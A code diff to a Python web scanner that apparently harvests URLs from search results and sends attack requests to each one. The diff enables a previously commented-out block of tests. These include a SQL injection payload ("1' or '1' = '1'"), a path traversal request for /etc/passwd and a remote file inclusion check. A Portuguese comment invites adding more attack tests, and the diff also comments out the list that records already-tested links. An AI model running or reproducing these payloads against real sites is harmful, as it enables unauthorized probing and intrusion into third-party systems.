@@ -51,14 +51,14 @@ def main():
         link = m.group('host')
         if link not in vuln:
             try:
-                vuln.append(link)
+                #vuln.append(link)
                 resp = requests.get(str(fullurl) + "=1\' or \'1\' = \'1\''", headers=buscar.request_headers, timeout=1)
                 body = resp.text
                 fullbody = body
                 if "You have an error in your SQL syntax" in fullbody:
                     print ("\n" + fullurl + " --> SQL injection vulnerable!")
 
-                """
+
                 #SE QUISER ADICIONAR OUTROS TESTES DE VULNERABILIDADES.. SEGUE O MODELO ABAIXO.
                 resp = requests.get(fullurl.split('=')[0] + '=../../../../../../etc/passwd', headers=buscar.request_headers, timeout=1)
                 body = resp.text
@@ -74,7 +74,7 @@ def main():
                 if "uid=(" in fullbody:
                     print ("\n" + fullurl + " --> RFI vulnerable!")
                     
-                """
+
 
             except (requests.exceptions.ConnectionError, requests.exceptions.MissingSchema, requests.exceptions.ContentDecodingError, requests.exceptions.ReadTimeout, requests.exceptions.TooManyRedirects, TypeError):
                 pass
